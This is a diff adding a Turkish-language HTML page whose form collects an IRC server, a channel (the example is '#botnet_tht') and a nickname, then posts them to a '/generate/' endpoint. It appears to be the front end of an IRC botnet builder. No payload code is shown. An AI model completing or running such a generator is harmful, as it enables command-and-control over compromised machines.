@@ -1,0 +1,36 @@
+<html lang="tr">
+    <meta charset="utf-8">
+    <style>
+    body {
+        background-color: black
+    }
+    img {
+        margin-top: -2%;
+        margin-left: 16%;
+        margin-bottom: 2%
+    }
+    input {
+        margin-left: 29%;
+        margin-top: 2%;
+        width: 44%
+    }
+    button {
+        margin-top: 3%;
+        margin-left: 39%;
+        width: 25%
+    }
+    </style>
+    <header>
+        <img src="banner.png"></img>
+    </header>
+    <body>
+        <form action="/generate/" method="POST">
+            <input type="text" name="IRC_LINK" placeholder="IRC Adresi (örn: irc.freenode.net:7000)">
+            <input type="text" name="IRC_CHANNEL" placeholder="IRC Kanalı (örn: #botnet_tht)">
+            <input type="text" name="IRC_NICK" placeholder="IRC Kullanıcı Adınız">
+            <div>
+                <input type="submit" name="submit" value="Oluştur">
+            </div>
+        </form>
+    </body>
+</html>
